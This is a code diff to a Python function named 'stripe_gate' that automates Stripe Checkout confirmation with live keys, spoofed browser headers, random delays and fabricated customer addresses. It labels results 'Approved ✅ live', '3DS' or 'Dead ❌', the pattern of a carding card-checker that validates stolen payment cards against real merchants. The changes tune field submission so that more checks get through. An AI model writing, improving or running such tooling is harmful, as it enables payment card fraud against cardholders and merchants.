@@ -698,7 +698,6 @@ async def stripe_gate(
         _session_mode = "payment"  # payment / subscription / setup
         _needs_email = False
         _update_ok = None  # None = not attempted, True/False = result
-        _any_details_needed = False
         for attempt in range(max_retries + 1):
             try:
                 r1 = await client.post(
@@ -776,9 +775,9 @@ async def stripe_gate(
             _phone_cfg = j1.get("phone_number_collection") or {}
             _needs_phone = _phone_cfg.get("enabled", False)
 
-            # Billing address collection
+            # Billing address collection — only force-collect when explicitly required
             _billing_cfg = j1.get("billing_address_collection") or ""
-            _needs_billing_addr = (_billing_cfg == "required" or _billing_cfg == "auto")
+            _needs_billing_addr = (_billing_cfg == "required")
 
             # Shipping address collection
             _shipping_cfg = j1.get("shipping_address_collection") or {}
@@ -885,31 +884,28 @@ async def stripe_gate(
         newpm = direct_pm
         await asyncio.sleep(random.uniform(0.3, 0.8))
 
-        # ── Step 2b: Submit customer details via /update (required by some merchants) ──
-        _any_details_needed = _needs_email or _needs_phone or _needs_billing_addr or _needs_shipping
-        if _any_details_needed:
-            update_data = {
-                "eid": "NA",
-                "key": pk_live,
-                "browser_locale": browser_locale,
-                "redirect_type": "url",
-            }
-            if init_checksum:
-                update_data["init_checksum"] = init_checksum
-            # Always include email — Stripe sessions expect it even if merchant pre-set it
-            update_data["email"] = email
-            # Phone
+        # ── Step 2b: Submit session-level details via /update ──
+        # Billing address comes from the PaymentMethod's billing_details (already set above).
+        # /update is ONLY for session-level fields: email, phone, shipping address.
+        _session_needs_update = _needs_email or _needs_phone or _needs_shipping
+        update_headers = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "user-agent": ua,
+            "origin": "https://checkout.stripe.com",
+            "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            **_common_sec,
+        }
+
+        if _session_needs_update:
+            update_data = {"eid": "NA", "key": pk_live}
+            if _needs_email:
+                update_data["email"] = email
             if _needs_phone:
                 update_data["phone_number"] = phone
-            # Billing address
-            if _needs_billing_addr:
-                update_data["billing_address[name]"] = f"{fname} {lname}"
-                update_data["billing_address[line1]"] = addr["street"]
-                update_data["billing_address[city]"] = addr["city"]
-                update_data["billing_address[state]"] = addr["state"]
-                update_data["billing_address[postal_code]"] = addr["zip"]
-                update_data["billing_address[country]"] = addr.get("country", "US")
-            # Shipping address (use same address as billing)
             if _needs_shipping:
                 update_data["shipping_address[name]"] = f"{fname} {lname}"
                 update_data["shipping_address[address][line1]"] = addr["street"]
@@ -917,18 +913,6 @@ async def stripe_gate(
                 update_data["shipping_address[address][state]"] = addr["state"]
                 update_data["shipping_address[address][postal_code]"] = addr["zip"]
                 update_data["shipping_address[address][country]"] = addr.get("country", "US")
-
-            update_headers = {
-                "accept": "application/json",
-                "content-type": "application/x-www-form-urlencoded",
-                "user-agent": ua,
-                "origin": "https://checkout.stripe.com",
-                "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-site",
-                **_common_sec,
-            }
             try:
                 r_upd = await client.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs_live}/update",
@@ -941,6 +925,35 @@ async def stripe_gate(
                     init_checksum = _upd_json.get("init_checksum", init_checksum)
             except Exception:
                 _update_ok = False
+
+        # If billing address is required, submit it in a dedicated /update call
+        if _needs_billing_addr:
+            billing_data = {
+                "eid": "NA",
+                "key": pk_live,
+                "billing_address[name]": f"{fname} {lname}",
+                "billing_address[line1]": addr["street"],
+                "billing_address[city]": addr["city"],
+                "billing_address[postal_code]": addr["zip"],
+                "billing_address[country]": addr.get("country", "US"),
+            }
+            if addr.get("state"):
+                billing_data["billing_address[state]"] = addr["state"]
+            try:
+                r_bill = await client.post(
+                    f"https://api.stripe.com/v1/payment_pages/{cs_live}/update",
+                    data=billing_data,
+                    headers=update_headers,
+                )
+                _billing_ok = r_bill.status_code in (200, 201)
+                if _billing_ok:
+                    _bill_json = r_bill.json()
+                    init_checksum = _bill_json.get("init_checksum", init_checksum)
+                elif _update_ok is None:
+                    _update_ok = False
+            except Exception:
+                if _update_ok is None:
+                    _update_ok = False
 
         await asyncio.sleep(random.uniform(0.4, 0.9))
 
@@ -966,33 +979,15 @@ async def stripe_gate(
             "expected_payment_method_type": "card",
             "key": pk_live,
             "js_checksum": js_checksum,
-            "browser_locale": browser_locale,
-            "redirect_type": "url",
         }
         if init_checksum:
             confirm_data["init_checksum"] = init_checksum
         if _needs_tos:
             confirm_data["consent[terms_of_service]"] = "accepted"
-
-        # Fallback: if /update failed, embed customer details directly in /confirm
-        if _update_ok is False or (_any_details_needed and _update_ok is None):
-            confirm_data["email"] = email
-            if _needs_phone:
-                confirm_data["phone_number"] = phone
-            if _needs_billing_addr:
-                confirm_data["billing_address[name]"] = f"{fname} {lname}"
-                confirm_data["billing_address[line1]"] = addr["street"]
-                confirm_data["billing_address[city]"] = addr["city"]
-                confirm_data["billing_address[state]"] = addr["state"]
-                confirm_data["billing_address[postal_code]"] = addr["zip"]
-                confirm_data["billing_address[country]"] = addr.get("country", "US")
-            if _needs_shipping:
-                confirm_data["shipping_address[name]"] = f"{fname} {lname}"
-                confirm_data["shipping_address[address][line1]"] = addr["street"]
-                confirm_data["shipping_address[address][city]"] = addr["city"]
-                confirm_data["shipping_address[address][state]"] = addr["state"]
-                confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
-                confirm_data["shipping_address[address][country]"] = addr.get("country", "US")
+        # Always include email in confirm — required for session completion
+        confirm_data["email"] = email
+        if _needs_phone:
+            confirm_data["phone_number"] = phone
 
         try:
             r3 = await client.post(
@@ -1023,52 +1018,49 @@ async def stripe_gate(
             code = err.get("code", "")
             msg = err.get("message", "")
 
-            # Detect Stripe session integrity / confirm errors — retry with embedded details
+            # Detect Stripe session integrity / confirm errors — retry with billing in confirm
             if "error has occurred confirming" in msg.lower():
-                if _any_details_needed and "email" not in confirm_data:
-                    confirm_data["email"] = email
-                    if _needs_phone:
-                        confirm_data["phone_number"] = phone
-                    if _needs_billing_addr:
-                        confirm_data["billing_address[name]"] = f"{fname} {lname}"
-                        confirm_data["billing_address[line1]"] = addr["street"]
-                        confirm_data["billing_address[city]"] = addr["city"]
-                        confirm_data["billing_address[state]"] = addr["state"]
-                        confirm_data["billing_address[postal_code]"] = addr["zip"]
-                        confirm_data["billing_address[country]"] = addr.get("country", "US")
-                    if _needs_shipping:
-                        confirm_data["shipping_address[name]"] = f"{fname} {lname}"
-                        confirm_data["shipping_address[address][line1]"] = addr["street"]
-                        confirm_data["shipping_address[address][city]"] = addr["city"]
-                        confirm_data["shipping_address[address][state]"] = addr["state"]
-                        confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
-                        confirm_data["shipping_address[address][country]"] = addr.get("country", "US")
-                    try:
-                        await asyncio.sleep(random.uniform(0.5, 1.2))
-                        r3 = await client.post(
-                            f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
-                            data=confirm_data,
-                            headers=checkout_headers,
-                        )
-                        j3 = r3.json()
-                        r3_text = r3.text
-                        surl = j3.get("success_url", surl)
-                        if j3.get("status") == "succeeded":
-                            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
-                        retry_err = (j3.get("error") or {})
-                        if retry_err.get("decline_code") or retry_err.get("code"):
-                            rdcode = retry_err.get("decline_code", "")
-                            rcode = retry_err.get("code", "")
-                            rmsg = retry_err.get("message", "")
-                            rclean, rstype = _classify_decline(rdcode, rcode, rmsg)
-                            rdc_label = rdcode or rcode or ""
-                            if rstype == "live":
-                                return "Approved! ✅ -» live", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
-                            elif rstype == "3ds":
-                                return "3DS 🔐", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
-                            return "Dead! ❌", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
-                    except Exception:
-                        pass
+                # Retry: embed billing + shipping directly in confirm
+                confirm_data["billing_address[name]"] = f"{fname} {lname}"
+                confirm_data["billing_address[line1]"] = addr["street"]
+                confirm_data["billing_address[city]"] = addr["city"]
+                confirm_data["billing_address[postal_code]"] = addr["zip"]
+                confirm_data["billing_address[country]"] = addr.get("country", "US")
+                if addr.get("state"):
+                    confirm_data["billing_address[state]"] = addr["state"]
+                if _needs_shipping:
+                    confirm_data["shipping_address[name]"] = f"{fname} {lname}"
+                    confirm_data["shipping_address[address][line1]"] = addr["street"]
+                    confirm_data["shipping_address[address][city]"] = addr["city"]
+                    confirm_data["shipping_address[address][state]"] = addr.get("state", "")
+                    confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
+                    confirm_data["shipping_address[address][country]"] = addr.get("country", "US")
+                try:
+                    await asyncio.sleep(random.uniform(0.5, 1.0))
+                    r3 = await client.post(
+                        f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
+                        data=confirm_data,
+                        headers=checkout_headers,
+                    )
+                    j3 = r3.json()
+                    r3_text = r3.text
+                    surl = j3.get("success_url", surl)
+                    if j3.get("status") == "succeeded":
+                        return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
+                    retry_err = (j3.get("error") or {})
+                    rdcode = retry_err.get("decline_code", "")
+                    rcode = retry_err.get("code", "")
+                    rmsg = retry_err.get("message", "")
+                    if rdcode or rcode:
+                        rclean, rstype = _classify_decline(rdcode, rcode, rmsg)
+                        rdc_label = rdcode or rcode or ""
+                        if rstype == "live":
+                            return "Approved! ✅ -» live", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
+                        elif rstype == "3ds":
+                            return "3DS 🔐", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
+                        return "Dead! ❌", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
+                except Exception:
+                    pass
 
                 diag_parts = [f"mode={_session_mode}"]
                 if _needs_email:
